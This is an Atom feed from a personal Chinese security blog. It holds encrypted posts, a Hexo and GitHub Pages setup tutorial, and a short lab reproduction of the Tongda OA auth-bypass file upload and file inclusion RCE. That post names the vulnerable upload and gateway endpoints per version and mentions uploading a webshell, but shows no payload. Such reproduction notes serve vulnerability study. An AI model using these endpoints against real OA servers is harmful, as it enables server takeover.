<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>忆时光</title>
  
  <subtitle>忆时光</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://mysecroad.github.io/"/>
  <updated>2020-04-25T13:55:18.179Z</updated>
  <id>http://mysecroad.github.io/</id>
  
  <author>
    <name>ca5tle</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>日志</title>
    <link href="http://mysecroad.github.io/posts/32353.html"/>
    <id>http://mysecroad.github.io/posts/32353.html</id>
    <published>2099-12-31T16:00:00.000Z</published>
    <updated>2020-04-25T13:55:18.179Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">输入密码，查看文章！</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="672ad81c9b335de9b6678249b364291578cfb42a427f960d6e8dad4472ad41c3">b3b84fb212479cf3c064455b955375aaf40dc952baa91f6570486afb9a397309758d96362ef6660259596c86bd09048ed30483ed1f77a9b8ad6413e13e82cff86fc2711dc94ee86d4d54f50d091ac50d0a5c58911caff25c0ffee44452de32165037d8ae344ccb13ab2a296bbd27f7d572ba0b4b76023f9d80fe9cc9064edb1f4ee744953dfb3060b698b57e1e4c8f357e420c1602361540e4bf51caa7f35ae942b4bae57cddaee3c910e6fc89dd235226c60bbfada7c0a0be960650d26a91db0bc79d785aa0ead60b9c229e90c5ecb9624781ff0704747cf2829822f8a332af54abf50766dd5ced1deda74404fd33bbead5e0bc817e0b38224adc5bf109ddc25232b0f1cf705eabf8bffa5ccb64c0f9182b34731276992b834e36c8ba949f971d54ea33b905086c68ddc1f9366130408fb1bd232ed5633c64409ecbadf03f57291eeadb9b69900eb658819a6faea4e32aca95f1401967c15b36a139334f9bf8be5bd0a53f486486f347467f1ceeee64ea3688ccf9c1a00e439fca6f4c72af07a8a1dd0f79cb7037cf379e4d50ffb636b2e596e7e1ebe68e5cfb20e157e29b60c0c935ea7068e99146e7acbb5ad783ea</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      输入密码，查看文章！
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>易错知识</title>
    <link href="http://mysecroad.github.io/posts/34260.html"/>
    <id>http://mysecroad.github.io/posts/34260.html</id>
    <published>2099-12-31T15:59:59.000Z</published>
    <updated>2020-04-25T03:09:14.921Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">输入密码，查看文章！</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="f4f25515922814b31789af777e8cc081f949bd50de753aaf64e1e2b4b1866cac">8de2c04a2d70dba63f65a56a98175f4a</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      输入密码，查看文章！
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>日常记录</title>
    <link href="http://mysecroad.github.io/posts/42951.html"/>
    <id>http://mysecroad.github.io/posts/42951.html</id>
    <published>2099-12-31T15:59:59.000Z</published>
    <updated>2020-04-25T03:09:14.919Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">输入密码，查看文章！</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="f4f25515922814b31789af777e8cc081f949bd50de753aaf64e1e2b4b1866cac">8de2c04a2d70dba63f65a56a98175f4a</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      输入密码，查看文章！
    
    </summary>
    
    
      <category term="总结" scheme="http://mysecroad.github.io/categories/%E6%80%BB%E7%BB%93/"/>
    
    
  </entry>
  
  <entry>
    <title>通达OA任意文件上传与文件包含导致RCE漏洞复现</title>
    <link href="http://mysecroad.github.io/posts/38272.html"/>
    <id>http://mysecroad.github.io/posts/38272.html</id>
    <published>2020-04-26T09:39:04.000Z</published>
    <updated>2020-04-26T13:14:50.427Z</updated>
    
    <content type="html"><![CDATA[<img src="/posts/38272/home.png" alt="home" style="zoom:80%;"><h2 id="0x00-漏洞简介"><a href="#0x00-漏洞简介" class="headerlink" title="0x00 漏洞简介"></a>0x00 漏洞简介</h2><p>通达OA（Office Anywhere网络智能办公系统）是由北京通达信科科技有限公司自主研发的协同办公自动化系统，包括流程审批、行政办公、日常事务、数据统计分析、即时通讯、移动办公等。</p><p>该漏洞被黑产利用，用于投放勒索病毒</p><p>该漏洞在绕过身份验证的情况下通过文件上传漏洞上传恶意php文件，组合文件包含漏洞最终造成远程代码执行漏洞，从而导致可以控制服务器system权限。</p><h2 id="0x01-影响版本"><a href="#0x01-影响版本" class="headerlink" title="0x01 影响版本"></a>0x01 影响版本</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">V11版</span><br><span class="line">2017版</span><br><span class="line">2016版</span><br><span class="line">2015版</span><br><span class="line">2013增强版</span><br><span class="line">2013版</span><br></pre></td></tr></table></figure><h2 id="0x02-利用条件"><a href="#0x02-利用条件" class="headerlink" title="0x02 利用条件"></a>0x02 利用条件</h2><h2 id="0x03-漏洞原理"><a href="#0x03-漏洞原理" class="headerlink" title="0x03 漏洞原理"></a>0x03 漏洞原理</h2><p>被授权的远程攻击者通过文件上传配合文件包含，触发远程恶意代码执行。系统中auth.php是登陆验证的相关逻辑，upload.php中$P参数如果非空就不需要经过auth.php验证即可执行后续代码。利用此处逻辑漏洞可绕过登陆验证直接上传文件。攻击者可通过精心构造json进入47行的includ_once进行文件包含。</p><h2 id="0x04-环境搭建"><a href="#0x04-环境搭建" class="headerlink" title="0x04 环境搭建"></a>0x04 环境搭建</h2><p>本次实验所用版本是<code>通达V11</code></p><p>链接：<a href="https://pan.baidu.com/s/1nm-kBi4zOwXDZFtjmf7n2Q" target="_blank" rel="noopener">https://pan.baidu.com/s/1nm-kBi4zOwXDZFtjmf7n2Q</a></p><p>提取码：z863</p><p>下载好源码，解压缩后直接运行exe文件安装，访问靶机IP即可，界面如上图。</p><p>本机IP：<code>192.168.150.142</code></p><h2 id="0x05-漏洞复现"><a href="#0x05-漏洞复现" class="headerlink" title="0x05 漏洞复现"></a>0x05 漏洞复现</h2><p>这里需要注意的是：有些版本的<code>gateway.php</code>路径不同。</p><p>2013</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;ispirit&#x2F;im&#x2F;upload.php</span><br><span class="line">&#x2F;ispirit&#x2F;interface&#x2F;gateway.php</span><br></pre></td></tr></table></figure><p>2017</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;ispirit&#x2F;im&#x2F;upload.php</span><br><span class="line">&#x2F;mac&#x2F;gateway.php</span><br></pre></td></tr></table></figure><p>V11</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;ispirit&#x2F;im&#x2F;upload.php</span><br><span class="line">&#x2F;ispirit&#x2F;interface&#x2F;gateway.php</span><br></pre></td></tr></table></figure><p>任意文件上传漏洞路径<code>/ispirit/im/upload.php</code></p><p><img src="/posts/38272/upload.png" alt="upload"></p><p>使用burp抓包发送小马数据包可以看到成功上传</p><h2 id="0x06-总结"><a href="#0x06-总结" class="headerlink" title="0x06 总结"></a>0x06 总结</h2>]]></content>
    
    <summary type="html">
    
      
      
        &lt;img src=&quot;/posts/38272/home.png&quot; alt=&quot;home&quot; style=&quot;zoom:80%;&quot;&gt;

&lt;h2 id=&quot;0x00-漏洞简介&quot;&gt;&lt;a href=&quot;#0x00-漏洞简介&quot; class=&quot;headerlink&quot; title=&quot;0x00 漏洞简介&quot;
      
    
    </summary>
    
    
      <category term="漏洞复现" scheme="http://mysecroad.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="漏洞复现" scheme="http://mysecroad.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>使用 hexo 搭建个人博客</title>
    <link href="http://mysecroad.github.io/posts/28047.html"/>
    <id>http://mysecroad.github.io/posts/28047.html</id>
    <published>2020-04-24T00:53:39.000Z</published>
    <updated>2020-04-25T08:41:52.330Z</updated>
    
    <content type="html"><![CDATA[<p>一直想搭建一个个人博客，用来记录平时的学习心得。我也用过很多博客，想CSDN、博客园、简书等，但最终还是选择了<code>hexo</code>，这是完全属于我自己的一方净土。</p><h2 id="什么是-hexo-？"><a href="#什么是-hexo-？" class="headerlink" title="什么是 hexo ？"></a>什么是 hexo ？</h2><p><a href="https://hexo.io/" target="_blank" rel="noopener">hexo</a>是个静态博客框架。使用 <a href="https://daringfireball.net/projects/markdown" target="_blank" rel="noopener">Markdown</a> 撰写好文章，Hexo 会转成静态网页部署到 <a href="https://pages.github.com/" target="_blank" rel="noopener">Github Pages</a>。</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><h3 id="安装-Node-js-和-Git"><a href="#安装-Node-js-和-Git" class="headerlink" title="安装 Node.js 和 Git"></a>安装 Node.js 和 Git</h3><p>在安装 Hexo 之前，首先要安装 <a href="https://nodejs.org/en/" target="_blank" rel="noopener">Node.js</a> 和 <a href="https://git-scm.com/" target="_blank" rel="noopener">Git</a>， Node.js 和 Git 的安装比较简单，请自行查看官方文档，这里不再赘述。</p><p>安装好 Node.js 和 Git 后，用 <a href="https://npmjs.org/" target="_blank" rel="noopener">npm</a> 安装 Hexo ， npm 是 Node.js 的 package manager，会随 Node.js 一同安装。由于墙的关系，建议 npm 换成国内的源，比如<a href="http://npm.taobao.org/" target="_blank" rel="noopener">淘宝 NPM 镜像</a>。推荐安装 <a href="https://github.com/Pana/nrm" target="_blank" rel="noopener">nrm</a> (NPM registry manager)，可以在不同的 registry 之间快速切换：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ npm install -g nrm <span class="comment"># 安装 nrm</span></span><br><span class="line">$ nrm ls <span class="comment"># registry 列表</span></span><br><span class="line">$ nrm use taobao  <span class="comment"># 将 registry 切换为 taobao</span></span><br></pre></td></tr></table></figure><h3 id="安装-hexo"><a href="#安装-hexo" class="headerlink" title="安装 hexo"></a>安装 hexo</h3><p>接着使用 npm 安装 hexo：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npm install hexo-cli -g</span><br></pre></td></tr></table></figure><h2 id="创建-Hexo-项目"><a href="#创建-Hexo-项目" class="headerlink" title="创建 Hexo 项目"></a>创建 Hexo 项目</h2><p>安装好 Hexo 后，在本地新建个文件夹作为 Hexo 项目文件夹，名称随意，我的叫 <code>lihthub.github.io</code> ，执行下列命令，Hexo 会在指定文件夹 <code>lihthub.github.io</code> 中新建所需要的文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ hexo init lihthub.github.io <span class="comment"># 初始化 Hexo 项目</span></span><br><span class="line">$ <span class="built_in">cd</span> lihthub.github.io</span><br><span class="line">$ npm install</span><br></pre></td></tr></table></figure><p>初始化后，会在文件夹 <code>lihthub.github.io</code> 里生成以下目录结构，这就是你的 Workspace：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── _config.yml <span class="comment"># 配置文件</span></span><br><span class="line">├── package.json <span class="comment"># 项目所需模块项目的配置信息</span></span><br><span class="line">├── scaffolds <span class="comment"># 用命令生成文章等的模板</span></span><br><span class="line">├── <span class="built_in">source</span> <span class="comment"># 源文件夹，这里放置网站内容</span></span><br><span class="line">|   ├── _drafts <span class="comment"># 放置草稿 markdown 文件</span></span><br><span class="line">|   └── _posts <span class="comment"># 放置博文 markdown 文件</span></span><br><span class="line">└── themes <span class="comment"># 主题文件夹，Hexo 通过将网站内容与主题相结合来生成一个静态网站</span></span><br></pre></td></tr></table></figure><p>在 <code>_config.yml</code> 配置文件中填写你的网站的 <code>title</code>、<code>description</code>、<code>author</code> 。更多配置请参考 <a href="https://hexo.io/docs/configuration.html" target="_blank" rel="noopener">Hexo Configuration</a>。</p><p>接着执行下列命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate # 生成静态文件</span><br><span class="line">$ hexo server # 启动本地服务</span><br></pre></td></tr></table></figure><p>缩写：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ hexo g</span><br><span class="line">$ hexo d</span><br><span class="line"><span class="comment"># 组合</span></span><br><span class="line">$ hexo d -g</span><br></pre></td></tr></table></figure><p>到这里本地的博客已经有了初步的原型，先访问 <a href="http://localhost:4000/" target="_blank" rel="noopener">http://localhost:4000/</a> 查看下效果，后面继续。</p><p>Hexo 的命令可以通过 <code>hexo help</code> 和 <code>hexo help [command]</code> 查看帮助，更多请参考 <a href="https://hexo.io/docs/commands.html" target="_blank" rel="noopener">Hexo Commands</a>。</p><h2 id="hexo-主题"><a href="#hexo-主题" class="headerlink" title="hexo 主题"></a>hexo 主题</h2><p>hexo 的默认主题不太喜欢，可以在 <a href="https://github.com/hexojs/hexo/wiki/Themes" target="_blank" rel="noopener">Hexo Themes</a> 选一款自己喜欢的主题，我用过很多主题，<code>next</code>、<code>3-hexo</code>、<code>yilia</code>，最终我还是觉得 <a href="https://github.com/probberechts/cactus-dark" target="_blank" rel="noopener">Cactus Dark</a> 更简单、更友好。</p><p>在 Github 下载主题文件，将文件整个目录 <code>cactus-dark</code> 复制到本地项目的 <code>themes</code> 目录下，然后修改配置文件 <code>_config.yml</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 站点根目录配置文件</span><br><span class="line">theme: cactus-dark</span><br></pre></td></tr></table></figure><p>主题相关的配置在 <code>themes/cactus-dark/_config.yml</code> 里面，可以设置链接、添加菜单等，根据自己的需要配置。</p><h2 id="hexo-插件"><a href="#hexo-插件" class="headerlink" title="hexo 插件"></a>hexo 插件</h2><h3 id="图片"><a href="#图片" class="headerlink" title="图片"></a>图片</h3><p><a href="https://github.com/CodeFalling/hexo-asset-image" target="_blank" rel="noopener">hexo-asset-image</a> 能帮助你更好地管理博客中所用到的图片，每篇博文都会生成一个单独的资源文件夹，而不是混在一起。安装命令是：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npm install hexo-asset-image --save</span><br></pre></td></tr></table></figure><p>并且需要在根 <code>_config.yml</code> 里设置 <code>post_asset_folder: true</code>。</p><p>安装完成后用 Hexo 新建文章时会在文章同目录下 <code>source/_posts</code> 生成一个和文章同名的文件夹，文章相关的所有图片放这个文件夹里就行，例如：</p><p>在文章中插入图片时链接只要写图片名称就可以，比如要插入 <code>logo.jpg</code> ，只要写成 <code>![logo](logo.jpg)</code>。</p><h3 id="RSS"><a href="#RSS" class="headerlink" title="RSS"></a>RSS</h3><p><a href="https://github.com/hexojs/hexo-generator-feed" target="_blank" rel="noopener">hexo-generator-feed</a> 可生成 <code>atom.xml</code> 文件供订阅使用，安装命令是：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npm install hexo-generator-feed --save</span><br></pre></td></tr></table></figure><p>在 <code>_config.yml</code> 中配置以下内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">feed:</span><br><span class="line">  type: atom</span><br><span class="line">  path: atom.xml</span><br><span class="line">  limit: 20</span><br><span class="line">  hub:</span><br><span class="line">  content:</span><br></pre></td></tr></table></figure><p>然后将 <code>/atom.xml</code> 链接添加到 <code>themes/cactus-dark/_config.yml</code> 中设置RSS的位置。</p><h3 id="Sitemap"><a href="#Sitemap" class="headerlink" title="Sitemap"></a>Sitemap</h3><p>Sitemap 可方便搜索引擎抓取网页，安装 <a href="https://github.com/hexojs/hexo-generator-sitemap" target="_blank" rel="noopener">hexo-generator-sitemap</a> 即可自动生成 sitemap.xml 文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npm install hexo-generator-sitemap --save</span><br></pre></td></tr></table></figure><p>站内搜索</p><p>首先安装 <a href="https://www.npmjs.com/package/hexo-generator-search" target="_blank" rel="noopener">hexo-generate-search</a> 插件，它会生成一个搜索索引文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npm install hexo-generator-search --save</span><br></pre></td></tr></table></figure><p>接下来，创建一个页面来显示搜索引擎：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new page search</span><br></pre></td></tr></table></figure><p>并将 <code>search: true</code> 放入 <a href="https://hexo.io/zh-cn/docs/front-matter.html" target="_blank" rel="noopener">Front-matter</a> ，也就是 <code>.md</code> 文件最上方以 <code>---</code> 分隔的区域。</p><p>最后编辑 <code>_config.yml</code> 并在导航菜单上添加一个搜索链接。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nav:</span><br><span class="line">  search: &#x2F;search&#x2F;</span><br></pre></td></tr></table></figure><p>更多 Hexo 插件请参考 <a href="https://hexo.io/plugins/" target="_blank" rel="noopener">Hexo Plugins</a></p><h2 id="发布到-GitHub"><a href="#发布到-GitHub" class="headerlink" title="发布到 GitHub"></a>发布到 GitHub</h2><p>至此本地的博客已经搭建起来了，下一步就是要发布到 Github。</p><p>发布到 Github 前首先要配置 Git 用户信息和在 Github 上加入 SSH key ，如果之前在 Github 上提交过项目或者配置过这两项则可以忽略。</p><h3 id="Git-用户信息"><a href="#Git-用户信息" class="headerlink" title="Git 用户信息"></a>Git 用户信息</h3><p>首先要配置的是你个人的用户名称和电子邮件地址。这两条配置很重要，每次 Git 提交时都会引用这两条信息，说明是谁提交了更新，所以会随更新内容一起被永久纳入历史记录：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git config --global user.name mysecroad <span class="comment"># github名</span></span><br><span class="line">$ git config --global user.email l13273816330@163.com</span><br></pre></td></tr></table></figure><p>如果用了 <code>--global</code> 选项，那么更改的配置文件就是位于你用户主目录下的那个，以后你所有的项目都会默认使用这里配置的用户信息。如果要在某个特定的项目中使用其他名字或者电邮，只要去掉 <code>--global</code> 选项重新配置即可，新的设定保存在当前项目的 <code>.git/config</code> 文件里。</p><h3 id="在-Github-添加-SSH-key"><a href="#在-Github-添加-SSH-key" class="headerlink" title="在 Github 添加 SSH key"></a>在 Github 添加 SSH key</h3><p>使用 SSH key 可以连接到 GitHub ，而无需在每次访问时提供用户名或密码，方便 Git 提交代码到 Github 。所以必须提供 SSH key 用于授权。生成 SSH key 的命令是（Linux/Mac 在终端输入，Windows 在 Git Bash 输入）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ssh-keygen -t rsa <span class="comment"># 指定 rsa 算法生成密钥</span></span><br></pre></td></tr></table></figure><p>接着连续三个回车键（不需要输入密码），然后就会生成两个文件 <code>id_rsa</code> 和 <code>id_rsa.pub</code> ，id_rsa 是密钥，id_rsa.pub 是公钥。这两个文件在 Linux/Mac 系统是在 <code>~/.ssh</code> 下，Windows 系统在 <code>C:/Users/username/.ssh</code> 下。</p><p>接下来要把 id_rsa.pub 的内容添加到 GitHub 上，这样你本地的 id_rsa 密钥跟 Github 上的 id_rsa.pub 公钥进行配对，授权成功才可以提交代码。</p><p>打开 Github 的 Setting 页面，点击左侧的 SSH and GPG keys：</p><p><img src="/posts/28047/F:%5Cmyblog%5Csource_posts%5C%E4%BD%BF%E7%94%A8-hexo-%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%5Cssh_key.png" alt></p><p>然后点击页面右上角的 New SSH key 按钮：</p><p><img src="/posts/28047/new_ssh.png" alt></p><p>在 Key 那栏把 <code>id_rsa.pub</code> 文件里的内容复制粘贴进去就可以了，<code>Title</code> 不需要填写，点击 Add SSH key 按钮就 ok 了。</p><p>SSH key 添加成功后，输入 <code>ssh -T git@github.com</code> 进行测试，如果出现以下提示就证明添加成功了。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ssh -T git@github.com</span><br><span class="line">Hi mysecroad! You<span class="string">'ve successfully authenticated, but GitHub does not provide shell access.</span></span><br></pre></td></tr></table></figure><h3 id="Github-Pages"><a href="#Github-Pages" class="headerlink" title="Github Pages"></a>Github Pages</h3><p>在 Github 上<a href="https://github.com/new" target="_blank" rel="noopener">新建</a>一个名为 <code>username</code>.github.io 的 repository ， username 是你的 Github 账号，比如我的叫 mysecroad.github.io 。然后修改配置文件 <code>_config.yml</code> 里的以下内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># url 就是刚才新建的 repository 的名称</span><br><span class="line"># repo 是刚才新建的 repository 的 SSH url</span><br><span class="line">url: https:&#x2F;&#x2F;mysecroad.github.io</span><br><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo: git@github.com:mysecroad&#x2F;mysecroad.github.io.git</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure><p>经过前面的更改主题、安装插件等一系列配置之后，静态文件需要重新生成：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ hexo clean # 清除 public 文件夹中的静态文件</span><br><span class="line">$ hexo generate # 生成静态文件</span><br><span class="line">$ hexo server # 启动本地服务</span><br></pre></td></tr></table></figure><p>访问 <a href="http://localhost:4000/" target="_blank" rel="noopener">http://localhost:4000/</a> 查看效果，确认页面无误后执行下列命令将静态文件发布到 Github:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy ==&gt; hexo d</span><br></pre></td></tr></table></figure><p>到这里博客就完全搭建起来了，访问 <a href="https://mysecroad.github.io/">https://mysecroad.github.io</a> 就可以看到博客了。</p><h2 id="写博客"><a href="#写博客" class="headerlink" title="写博客"></a>写博客</h2><p>正式发表博客前可以先打个草稿：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new draft <span class="string">"hello-world"</span> <span class="comment"># 新建标题为 hello-world 的草稿</span></span><br></pre></td></tr></table></figure><p>执行此命令后，会在 <code>source/_drafts</code> 目录下生成一个 <code>hello-world.md</code> 文件，然后用文本编辑器打开 <code>hello-world.md</code> 就可以编辑博文了，使用 <a href="https://daringfireball.net/projects/markdown" target="_blank" rel="noopener">Markdown</a> 撰写。</p><p>新建草稿时标题建议使用英文单词之间加横杠的这种形式，例如 “hello-world” ，而不要使用中文，因为默认会使用文件名作为文章的 url，真正的标题可以在 <code>hello-world.md</code> 文件里面设置。</p><p>默认情况下，草稿不显示。可以在运行 Hexo 时添加 <code>--draft</code> 选项：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server --draft <span class="comment"># 启动服务并预览草稿</span></span><br><span class="line">$ hexo publish <span class="string">"hello-world"</span> <span class="comment"># 发布草稿，会把草稿移到 source/_posts 目录下</span></span><br><span class="line">$ hexo deploy --generate <span class="comment"># 生成静态文件并发布到 Github</span></span><br></pre></td></tr></table></figure><p>也可以不打草稿：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new post <span class="string">"hello-world"</span> <span class="comment"># 新建标题为 hellow-world 的博文</span></span><br></pre></td></tr></table></figure><p>这个命令会在 <code>source/_posts</code> 目录下生成一个 <code>hello-world.md</code> 文件，同样使用文本编辑器编辑这个文件。博文写完预览后直接发布到 Github：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ hexo clean</span><br><span class="line">$ hexo d -g</span><br></pre></td></tr></table></figure><p>更多请参考 <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Hexo Writing</a>。</p><h2 id="源文件管理"><a href="#源文件管理" class="headerlink" title="源文件管理"></a>源文件管理</h2><p>如果要用另一台电脑写博客怎么办呢，这里介绍一种方法就是使用 Git 分支，创建两个分支，一个分支用来放博客的原始文件，另一个分支用来放生成的静态文件。</p><h3 id="提交源文件到分支"><a href="#提交源文件到分支" class="headerlink" title="提交源文件到分支"></a>提交源文件到分支</h3><p>先删除 <code>themes</code> 文件夹下的 <code>.git</code> 文件。然后在 <code>_config.yml</code> 中的 <code>deploy</code> 参数下设置 <code>branch: master</code> ，如果前面已经设置过就不用改了，这一步是为了确认将静态文件提交到 <code>master</code> 分支：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo: git@github.com:lihthub&#x2F;lihthub.github.io.git</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure><p>接着在本地博客文件夹下依次执行下列命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ git init <span class="comment"># 初始化 Git 项目</span></span><br><span class="line">$ git checkout -b develop <span class="comment"># 新建并切换到 develop 分支</span></span><br><span class="line"><span class="comment"># 添加远程仓库 origin ，后面是你在 Github 上创建的 repository 的 url</span></span><br><span class="line">$ git remote add origin git@github.com:lihthub/lihthub.github.io.git</span><br><span class="line">$ git add . <span class="comment"># 将当前目录的所有文件加入暂存区</span></span><br><span class="line">$ git commit -m <span class="string">"提交说明"</span> <span class="comment"># 提交更新</span></span><br><span class="line">$ git push origin develop <span class="comment"># 推送到远程仓库 origin 的 develop 分支</span></span><br></pre></td></tr></table></figure><p>需要注意的是本地博客文件夹根目录下的 <code>.gitignore</code> 是 Hexo 自带的文件，也要提交到仓库，里面列的是要被 Git 忽略的文件，这些文件不需要纳入 Git 的管理。</p><p>这样就把本地博客项目提交到你的 Github 中 <code>mysecroad.github.io</code> 仓库的 <code>develop</code> 分支上了。然后将仓库的默认分支设置为 <code>develop</code>，因为 <code>develop</code> 分支需要手动管理。</p><p>在 Github 中打开 <code>mysecorad.github.io</code> 仓库的主页面，点击上面的 2 branches:</p><p><img src="/posts/28047/F:%5Cmyblog%5Csource_posts%5C%E4%BD%BF%E7%94%A8-hexo-%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%5Cgithub.io.png" alt></p><p>然后点击页面右上角的 Change default branch 按钮:</p><p><img src="/posts/28047/F:%5Cmyblog%5Csource_posts%5C%E4%BD%BF%E7%94%A8-hexo-%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%5Cchange_brance.png" alt></p><p>然后按下图所示依次点击将 Default branch 设为 <code>develop</code>:</p><p><img 